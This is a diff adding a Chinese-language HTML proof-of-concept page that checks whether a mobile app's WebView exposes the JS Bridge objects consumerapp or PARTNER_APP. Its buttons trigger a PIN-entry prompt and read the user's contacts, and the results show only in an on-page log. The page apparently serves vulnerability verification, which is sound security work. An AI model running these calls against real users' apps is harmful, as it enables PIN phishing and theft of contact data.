@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JS Bridge 漏洞验证 (PoC)</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        button { width: 100%; padding: 15px; margin: 10px 0; background-color: #ff4d4f; color: white; border: none; border-radius: 5px; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <h2>JS Bridge 敏感接口暴露验证</h2>
+    <p>当前页面域名: <script>document.write(window.location.href);</script></p>
+    
+    <button onclick="testTriggerPin()">1. 尝试触发 PIN 码输入弹窗</button>
+    <button onclick="testObtainContact()">2. 尝试获取通讯录</button>
+
+    <hr>
+    <h3>日志输出:</h3>
+    <div id="log" style="background: #f5f5f5; padding: 10px; border-radius: 5px; min-height: 100px; white-space: pre-wrap;"></div>
+
+    <script>
+        function showLog(msg) {
+            document.getElementById('log').innerText += msg + "\n";
+        }
+
+        // 检测注入对象是否存在
+        window.onload = function() {
+            // 根据分析，Partner 端和 Consumer 端映射的对象名可能不同
+            const bridgeName = window.PARTNER_APP ? 'PARTNER_APP' : (window.consumerapp ? 'consumerapp' : null);
+            
+            if (bridgeName) {
+                showLog(`[+] 成功检测到 JS Bridge 对象: window.${bridgeName}`);
+            } else {
+                showLog(`[-] 未检测到预期的 JS Bridge 对象，请确认是否在目标 App 的 WebView 中打开`);
+            }
+        };
+
+        // 验证 1: 触发 PIN 码
+        function testTriggerPin() {
+            try {
+                // 优先尝试通用的 evaluate 接口
+                if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
+                    showLog("[*] 正在通过 consumerapp.evaluate 尝试触发 kWebRequestPin...");
+                    window.consumerapp.evaluate("kWebRequestPin", JSON.stringify({ "reason": "PoC 测试触发 PIN 码" }));
+                } else if (window.PARTNER_APP && typeof window.PARTNER_APP.evaluate === 'function') {
+                    showLog("[*] 正在通过 PARTNER_APP.evaluate 尝试触发 kWebRequestPin...");
+                    window.PARTNER_APP.evaluate("kWebRequestPin", JSON.stringify({ "reason": "PoC 测试触发 PIN 码" }));
+                } else {
+                    showLog("[-] 未找到支持 evaluate 的对象");
+                }
+            } catch (e) {
+                showLog("[-] 执行异常: " + e.message);
+            }
+        }
+
+        // 验证 2: 获取通讯录
+        function testObtainContact() {
+            try {
+                if (window.consumerapp && typeof window.consumerapp.obtainContact === 'function') {
+                    showLog("[*] 正在调用 consumerapp.obtainContact()...");
+                    window.consumerapp.obtainContact();
+                } else {
+                    showLog("[-] 当前绑定的对象不支持直接调用 obtainContact");
+                }
+            } catch (e) {
+                showLog("[-] 执行异常: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
